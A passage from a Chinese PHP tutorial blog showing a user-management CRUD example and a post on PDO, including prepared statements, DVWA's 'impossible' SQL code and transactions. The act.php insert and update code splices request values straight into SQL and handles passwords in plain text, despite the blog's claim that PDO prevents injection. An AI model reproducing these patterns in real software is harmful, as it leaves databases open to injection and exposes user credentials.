&lt;title&gt;update&lt;/title&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;/head&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"bower_components/jquery/dist/jquery.min.js"</span>&gt;&lt;/script&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"bower_components/bootstrap/dist/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"bower_components/bootstrap/dist/css/bootstrap.min.css"</span>&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;div class="container"&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;h1 class="page-header"&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;a href="index.php" class="btn btn-warning"&gt;查看用户&lt;/a&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;a href="" class="btn btn-primary"&gt;修改用户&lt;/a&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;/h1&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;form action=<span class="string">"act.php?act=update&amp;Id=&lt;?php echo $Id;?&gt;"</span> method=<span class="string">"post"</span>&gt; &lt;!-- act页面实现的修改功能，这里只需要传入要修改的Id值就可以更改此Id中对应的数据 --&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;div class="form-group"&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &lt;label&gt;新用户名:&lt;/label&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &lt;input type="text" class="form-control" name="Name" value=&lt;?php echo "&#123;$row['Name']&#125;";//把查询到的数据的Name返回到输入框中，这样子我们就可以实现修改功能 ?&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;/div&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;div class="form-group"&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &lt;label&gt;新密码:&lt;/label&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &lt;input type="text" class="form-control" name="Pwd" value=</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"&#123;$row['Pwd']&#125;"</span>; <span class="comment">//同上<span class="meta">?&gt;</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;/div&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;div class="form-group"&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &lt;input type="submit" class="btn btn-primary"&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &lt;input type="reset" class="btn btn-danger"&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &lt;/div&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &lt;/form&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;/div&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;/body&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;/html&gt;</span></pre></td></tr></table></figure>

<h2 id="插入数据代码："><a href="#插入数据代码：" class="headerlink" title="插入数据代码："></a>插入数据代码：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>add<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"bower_components/jquery/dist/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"bower_components/bootstrap/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"bower_components/bootstrap/dist/css/bootstrap.min.css"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span> <span class="attr">class</span>=<span class="string">"btn btn-warning"</span>&gt;</span>查看用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"act.php?act=insert"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span> <span class="comment">&lt;!-- act.php页面实现了插入功能，所以这里我们只需要把内容提交到act.php就可以完成插入内容 --&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">				<span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"Name"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">				<span class="tag">&lt;<span class="name">label</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"Pwd"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></pre></td></tr></table></figure>

<h2 id="删除功能代码"><a href="#删除功能代码" class="headerlink" title="删除功能代码:"></a>删除功能代码:</h2><p><strong>删除页面代码也在首页(index.php)里实现的</strong><br><img src="http://static.zybuluo.com/1kbfree/snrsn6lp951qha73mz3fbdpa/image_1cc57auk9gkn62o16121cad1bau9.png" alt="image_1cc57auk9gkn62o16121cad1bau9.png-104.5kB"><br><em>一般我们删除操作是需要十分谨慎的，因为数据一旦删除是无法恢复的，那么如果用户不小心点到了按钮，我们就应该提醒他是否要删除。</em></p>
<p><img src="http://static.zybuluo.com/1kbfree/h9iti01jywhmby5a3x4n8h3o/image_1cc57donr1leu1i341t1r1479fafm.png" alt="image_1cc57donr1leu1i341t1r1479fafm.png-36kB"><br><em>可以看到这里有一个class是delete，然后看到下面有一段提醒是否执行删除的JS代码：</em><br><img src="http://static.zybuluo.com/1kbfree/79lf8bu5wdylyn1rmkhrzgu9/image_1cc57nvhn1dml1u0910ko1sccv4213.png" alt="image_1cc57nvhn1dml1u0910ko1sccv4213.png-48.6kB"></p>
<h2 id="最后我们看看act-php的代码："><a href="#最后我们看看act-php的代码：" class="headerlink" title="最后我们看看act.php的代码："></a>最后我们看看act.php的代码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">include</span> <span class="string">'config.inc.php'</span>; <span class="comment">//包含PDO链接数据库代码</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	$act = $_GET[<span class="string">"act"</span>]; <span class="comment">//获取GET请求过来的act值，来实现增、删、改。</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">if</span>($act == <span class="string">'delete'</span>)&#123; <span class="comment">//如果是选择删除</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    	$Id = $_GET[<span class="string">"Id"</span>]; <span class="comment">//获取GET请求过来的ID</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    	$sql = <span class="string">"delete from t1 where Id=?"</span>; <span class="comment">//这是SQL语句的删除</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    	$smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    	$smt-&gt;bindValue(<span class="number">1</span>,$Id); <span class="comment">//绑定一个值到用作预处理的 SQL 语句中的对应命名占位符或问号占位符</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">if</span>($smt-&gt;execute())&#123; <span class="comment">//判断是否执行成功，如果执行成功返回的是1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script&gt;location='index.php'&lt;/script&gt;"</span>; <span class="comment">//执行成功就跳转到首页(index.php)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">if</span>($act == <span class="string">'insert'</span>)&#123; <span class="comment">//如果是选择插入</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $Name = $_POST[<span class="string">"Name"</span>]; <span class="comment">//获取POST请求的Name值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $Pwd = $_POST[<span class="string">"Pwd"</span>]; <span class="comment">//获取POST请求的Pwd值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $sql = <span class="string">"insert into t1(Name,Pwd) values('&#123;$Name&#125;','&#123;$Pwd&#125;')"</span>; <span class="comment">//这是SQL语句的插入</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span>($smt-&gt;execute())&#123; <span class="comment">//判断是否执行成功</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;location='index.php'&lt;/script&gt;"</span>; <span class="comment">//执行成功就跳转到首页(index.php)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">/*如果act=update和id=x，那么就执行修改的SQL语句，修改条件(where)是Id=x*/</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">if</span>($act == <span class="string">'update'</span>)&#123; <span class="comment">//如果是更改</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		$Id = $_GET[<span class="string">"Id"</span>]; <span class="comment">//获取GET请求的Id值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		$Name = $_POST[<span class="string">"Name"</span>]; <span class="comment">//获取POST的Name值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		$Pwd = $_POST[<span class="string">"Pwd"</span>]; <span class="comment">//获取POST请求的Pwd值</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		$sql = <span class="string">"update t1 set Name='&#123;$Name&#125;',Pwd='&#123;$Pwd&#125;' where Id=&#123;$Id&#125;"</span>; <span class="comment">//这是SQL语句的更改</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		$smt = $pdo-&gt;prepare($sql); <span class="comment">//给SQL语句做标记</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">if</span>($smt-&gt;execute())&#123; <span class="comment">//判断是否执行成功</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;script&gt;location='index.php'&lt;/script&gt;"</span>; <span class="comment">//如果执行成功就跳转到首页(index.php)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	</span></pre></td></tr><tr><td class="code"><pre><span class="line"> <span class="meta">?&gt;</span></span></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PDO讲解</title>
    <url>/2018/01/11/PDO%E8%AE%B2%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p>使用<code>PDO</code>写数据库交互是可以防止<code>SQL</code>注入的</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/fx387ecie2unazbbpanj3mpg/image_1cc32g77o3lk1cbj1uv2virsj69.png" alt="image_1cc32g77o3lk1cbj1uv2virsj69.png-571.7kB"></p>
<hr>
<p><img src="http://static.zybuluo.com/1kbfree/ug4yfcx97r8s75p2nj353vi0/image_1cc32sdo6pftr6clk8hh98113.png" alt="image_1cc32sdo6pftr6clk8hh98113.png-354.7kB"><br><img src="http://static.zybuluo.com/1kbfree/wd31vaty60nof9z7ka5t66wz/image_1cc32s7g45hd20j1c24lrfoktm.png" alt="image_1cc32s7g45hd20j1c24lrfoktm.png-88.7kB"><br><em>因为没有输入密码 所以执行错误，打印了catch语句里的内容</em></p>
<hr>
<p><strong>exec():</strong><br><em>返回SQL语句执行后受影响的行数</em><br><img src="http://static.zybuluo.com/1kbfree/obb416n76s5k3maj9s695u8s/image_1cc33efh1khk1bnvi4tkcr11kk1g.png" alt="image_1cc33efh1khk1bnvi4tkcr11kk1g.png-571.3kB"></p>
<p><strong>就是这样:</strong><br><img src="http://static.zybuluo.com/1kbfree/2nzzje2iygtmxz99l8heysc0/image_1cc33p2h61joh3245hg1avv1rgp2a.png" alt="image_1cc33p2h61joh3245hg1avv1rgp2a.png-63.8kB"></p>
<blockquote>
<p>所以一般增删改都用exec()，这样子我们就可以很清楚的知道是否执行成功，如果exec()返回的结果为0，那么这肯定是没成功执行(增删改)的。</p>
</blockquote>
<hr>
<p><strong>query():</strong><br><em>返回SQL语句执行后放回的数据</em></p>
<p><strong>先看看数据库里都有什么数据：</strong><br><img src="http://static.zybuluo.com/1kbfree/sbrk7ptu73ljfxw9b6y6gzvz/image_1cc354nl6shfns1ua2vgtoo92n.png" alt="image_1cc354nl6shfns1ua2vgtoo92n.png-16.5kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F; ... ...(其他省略，主要看sql语句和query的用法)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $sqlTotal &#x3D; &quot;select * from t1&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $s &#x3D; $smtTotal &#x3D; $pdo-&gt;query($sqlTotal); </span></pre></td></tr><tr><td class="code"><pre><span class="line">    foreach ($s as $key)&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print_r($key);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F; ... ...</span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<p><strong>页面上返回的结果:</strong></p>
<p><img src="http://static.zybuluo.com/1kbfree/aoki2y2syez4loztvnafw4nu/image_1cc356qhj1nov1f433tc1tu4m7l5m.png" alt="image_1cc356qhj1nov1f433tc1tu4m7l5m.png-159.5kB"></p>
<blockquote>
<p>所以，一般是用来查询的都是用query()，这样我们就可以看到查询到的结果了。</p>
</blockquote>
<hr>
<h2 id="预处理："><a href="#预处理：" class="headerlink" title="预处理："></a>预处理：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;*这样可以防SQL注入，DVWA的impossible级别也是这样写的*&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;blog&#39;,&#39;root&#39;,&#39;root&#39;); </span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo-&gt;exec(&#39;set names utf8&#39;); &#x2F;&#x2F;设置编码</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_ASSOC); &#x2F;&#x2F;设置默认结果集模式为关联数组</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); &#x2F;&#x2F;修改报错模式</span></pre></td></tr><tr><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="code"><pre><span class="line">    $sql_query &#x3D; &quot;select * from users where id&#x3D;(:id)&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 &#x3D; $pdo -&gt; prepare($sql_query); &#x2F;&#x2F;准备要执行的SQL语句并返回一个 PDOStatement 对象</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 -&gt; bindParam(&#39;:id&#39;,$id,PDO::PARAM_INT); &#x2F;&#x2F;绑定参数，想成是把:id的值替换成$id变量里的值</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $id &#x3D; $_GET[&#39;id&#39;]; &#x2F;&#x2F;获取GET请求过来的ID值</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 -&gt; execute(); &#x2F;&#x2F;执行这个SQL语句</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $row &#x3D; $pre2 -&gt; fetch(); &#x2F;&#x2F;fetch()是返回执行结果(无论怎么查询，最多只能返回一条数据)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print_r($row); &#x2F;&#x2F;打印查询的结果</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
<p><strong>结果:</strong><br><img src="http://static.zybuluo.com/1kbfree/vno2s0kjj5exw0gnpq4kp7hg/image_1cc3m5vlj18qnqpjt5s901e0nm.png" alt="image_1cc3m5vlj18qnqpjt5s901e0nm.png-130.2kB"></p>
<p><strong>也可以这样的方式：</strong><br><img src="http://static.zybuluo.com/1kbfree/2u0htidmtsk8hblh5mu9tl5j/image_1cc3lfrhe1kfsrlpoq25pv166e9.png" alt="image_1cc3lfrhe1kfsrlpoq25pv166e9.png-419.3kB"><br><em>这样子是有好处的，比如表单提交过来的数据就是一个数组，我们可以通过直接传递数组，方便许多。</em></p>
<p><strong>DVWA里impossible级别的SQL注入测试代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span></pre></td></tr><tr><td class="code"><pre><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F; Get input</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ];</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F; Was a number entered?</span></pre></td></tr><tr><td class="code"><pre><span class="line">    if(is_numeric( $id )) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#x2F;&#x2F; Check the database</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; );</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $data-&gt;execute();</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $row &#x3D; $data-&gt;fetch();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#x2F;&#x2F; Make sure only 1 result is returned</span></pre></td></tr><tr><td class="code"><pre><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#x2F;&#x2F; Get values</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $first &#x3D; $row[ &#39;first_name&#39; ];</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $last  &#x3D; $row[ &#39;last_name&#39; ];</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#x2F;&#x2F; Feedback for end user</span></pre></td></tr><tr><td class="code"><pre><span class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span></pre></td></tr><tr><td class="code"><pre><span class="line">generateSessionToken(); &#x2F;&#x2F; 这个是DVWA里的防止CSRF的，可以不用管</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>

<blockquote>
<p>上面的fetch()只返回一条数据，我们可以用fetchALL来返回多条数据</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F;$sql_query &#x3D; &quot;select * from users where id&#x3D;(:id)&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $sql_query &#x3D; &quot;select * from users where id&gt;(:id)&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 &#x3D; $pdo -&gt; prepare($sql_query); &#x2F;&#x2F;准备要执行的SQL语句并返回一个 PDOStatement 对象</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 -&gt; bindParam(&#39;:id&#39;,$id,PDO::PARAM_INT); &#x2F;&#x2F;绑定参数，想成是把:id的值替换成$id变量里的值</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $id &#x3D; $_GET[&#39;id&#39;]; &#x2F;&#x2F;获取GET请求过来的ID值</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $pre2 -&gt; execute(); &#x2F;&#x2F;执行这个SQL语句</span></pre></td></tr><tr><td class="code"><pre><span class="line">    $row &#x3D; $pre2 -&gt; fetchALL(); &#x2F;&#x2F;fetch()是返回执行结果</span></pre></td></tr><tr><td class="code"><pre><span class="line">    foreach ($row as $key)&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print_r($key);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        echo &quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
<p><strong>结果:</strong><br><img src="http://static.zybuluo.com/1kbfree/zc49w9nzjoki35prbg5bkzjw/image_1cc3nhcu51gg81v7v1qr01rq71gdg9.png" alt="image_1cc3nhcu51gg81v7v1qr01rq71gdg9.png-187.3kB"></p>
<hr>
<h2 id="事物处理："><a href="#事物处理：" class="headerlink" title="事物处理："></a>事物处理：</h2><p><strong>比如我们去银行汇款的时候，由于某些问题，收款人未收到金额，这个时候汇款人肯定会找银行解决这个问题的，那么久需要用到事物处理了，将用户汇过去的钱还原到数据库里</strong></p>
<p><strong>首先我创建了一个表，里面有one和two用户，他们的存款都有1000:</strong><br><img src="http://static.zybuluo.com/1kbfree/j84jagbmu4gvtudeqqav4kfi/image_1cc3p6fobp1ugcjulu1gte1ik7m.png" alt="image_1cc3p6fobp1ugcjulu1gte1ik7m.png-3.6kB"></p>
<p><strong>我们先开启事物处理<code>start transaction;</code>：</strong><br><img src="http://static.zybuluo.com/1kbfree/2riobexnidqc63em4m3vftit/image_1cc3pfsu1fs51plh15s6hbp6de13.png" alt="image_1cc3pfsu1fs51plh15s6hbp6de13.png-1.9kB"></p>
<p><strong>然后这个时候当one用户想给two用户转100元的时候，出现了问题：</strong><br><img src="http://static.zybuluo.com/1kbfree/mr1a2cg6opa4ac7ze4wtkhld/image_1cc3pik7fm031drqil2140mfs20.png" alt="image_1cc3pik7fm031drqil2140mfs20.png-12.2kB"><br><em>这里one用户的钱没汇到two账户里，却仍然扣除了100元，那么银行知道了事情的真实性，肯定会去处理的，这个时候我们就要用到<code>rollback</code>了，可以回轨(悔棋~)</em></p>
<hr>
<p><strong>fetchColumn():</strong><br>从结果集中的下一行获取第一列</p>
